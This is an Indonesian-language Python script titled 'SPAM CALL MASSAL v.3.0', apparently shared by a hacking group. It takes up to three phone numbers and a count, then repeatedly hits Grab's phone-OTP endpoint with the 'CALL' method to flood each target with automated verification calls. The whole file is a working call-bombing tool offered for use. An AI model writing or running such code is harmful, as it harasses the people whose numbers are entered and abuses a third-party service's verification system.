#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			SPAM CALL MASSAL v.3.0%s
 ,_     _‚
 |\\\___//|	%sAuthor: KANG-NEWBIE%s
 |=6   6=|	%sContact: https://t.me/kang_nuubi%s
 \=._Y_.=/	%sGithub: https://github.com/KANG-NEWBIE%s
  )  `  (    ,	%sTEAM: CRABS (t.me/CRABS_ID)%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
\| |._.| |/-’
 '"'   '"'
<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, silahkan hubungi saya"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
no1 = input("[?] NUM TARGET 1 => %s"%(w))
no2 = input("%s[?] NUM TARGET 2 => %s"%(g,w))
no3 = input("%s[?] NUM TARGET 3 => %s"%(g,w))
jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		if str(idk) in str(r1.text):
			print("[+] TARGET1 BERHASIL")
		else:
			print("[-] TARGET1 GAGAL")
		if str(idk) in str(r2.text):
			print("[+] TARGET2 BERHASIL")
		else:
			print("[-] TARGET2 GAGAL")
		if str(idk) in str(r3.text):
			print("[+] TARGET3 BERHASIL")
		else:
			print("[-] TARGET3 GAGAL")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%ssampai jumpa gan..."%(c))
